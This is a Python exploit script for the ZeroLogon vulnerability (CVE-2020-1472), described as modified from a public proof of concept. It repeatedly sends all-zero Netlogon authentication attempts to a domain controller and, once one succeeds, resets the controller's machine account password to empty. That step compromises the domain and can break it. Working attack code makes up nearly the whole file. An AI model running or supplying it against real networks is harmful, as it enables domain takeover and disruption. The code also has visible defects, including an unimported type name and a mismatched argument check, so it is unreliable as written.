#!/usr/bin/env python3
######################################################################################
# Windows ZeroLogon Exploit (CVE-2020-1472) using the impacket toolset
#
# Credit: Modified from the Secura PoC found at
# https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py
######################################################################################
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.nrpc import NetrServerPasswordSet2
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call


# Give up brute-forcing after this many attempts. If vulnerable, ~256 attempts are expected to be necessary on average.
# False negative chance: ~0.04%
MAX_ATTEMPTS = 2000


def fail(msg) -> None:
    print(msg, file=sys.stderr)
    print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
    sys.exit(2)


def try_zero_authenticate(dc_handle: str, dc_ip: str, target_computer: str) -> DCERPC_v5 | None:
    # Connect to the DC's Netlogon service.
    binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
    rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
    rpc_con.connect()
    rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

    # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

    # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
    flags = 0x212fffff

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00',
            target_computer + '$\x00',
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            target_computer + '\x00',
            ciphertext,
            flags
        )

        # It worked!
        # assert server_auth['ErrorCode'] == 0
        # now let's exploit the vulnerability:
        new_pass_request: NetrServerPasswordSet2 = nrpc.NetrServerPasswordSet2()
        new_pass_request['PrimaryName'] = dc_handle + '\x00'
        new_pass_request['AccountName'] = target_computer + '$\x00'
        new_pass_request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        auth = nrpc.NETLOGON_AUTHENTICATOR()
        auth['Credential'] = b'\x00' * 8
        auth['Timestamp'] = 0
        new_pass_request['Authenticator'] = auth
        new_pass_request['ComputerName'] = target_computer + '\x00'
        new_pass_request['ClearNewPassword'] = b'\x00' * 516
        rpc_con.request(new_pass_request)
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
        # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
    except BaseException as ex:
        fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle: str, dc_ip: str, target_computer: str) -> None:
    # Keep authenticating until successful. Expected average number of attempts needed: 256.
    print('Performing authentication attempts...')
    rpc_con = None
    for attempt in range(0, MAX_ATTEMPTS):
        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

        if not rpc_con:
            print('=', end='', flush=True)
        else:
            break

    if rpc_con:
        print('\nSuccess! DC can be fully compromised by a ZeroLogon attack.')
    else:
        print('\nAttack failed. Target is probably patched.')
        sys.exit(1)


if __name__ == '__main__':
    if not (3 <= len(sys.argv) <= 4):
        print('Usage: zerologon.py <dc-name> <dc-ip>\n')
        print('Tests whether a domain controller is vulnerable to the ZeroLogon attack and sets an empty password.')
        print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
        sys.exit(1)
    else:
        [_, dc_name, dc_ip] = sys.argv

        dc_name = dc_name.rstrip('$')
        perform_attack('\\\\' + dc_name, dc_ip, dc_name)
